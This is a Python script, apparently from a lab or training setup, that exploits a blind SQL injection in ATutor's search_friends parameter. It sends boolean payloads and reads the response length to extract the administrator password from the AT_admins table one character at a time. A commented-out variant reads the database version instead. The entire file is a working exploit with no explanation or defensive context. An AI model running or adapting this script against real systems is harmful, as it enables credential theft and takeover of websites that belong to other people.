import sys
import re
import requests
from bs4 import BeautifulSoup
def searchFriends_sqli(ip, inj_str):
	target = "http://{0}/ATutor/mods/_standard/social/index_public.php?search_friends={1}".format(ip,inj_str)
	r = requests.get(target)
	s = BeautifulSoup(r.text, 'lxml')
	#print (len(s.text))
	return len(s.text)

def loop():
	for count in range(1,20):
		for i in range(32, 126):
			#inj_str = "q=test%27)/**/or/**/(select/**/ascii(substring((select/**/version()),{1},1)))={0}%23".format(i,count)
			inj_str = "q=test%27)/**/or/**/(select/**/ascii(substring((select/**/password/**/from/**/AT_admins),{1},1)))={0}%23".format(i,count)
			length = searchFriends_sqli(ip,inj_str)
			if length == 537:
				print(chr(i),end='')
				break
			else:
				pass

ip = "atutor"
loop()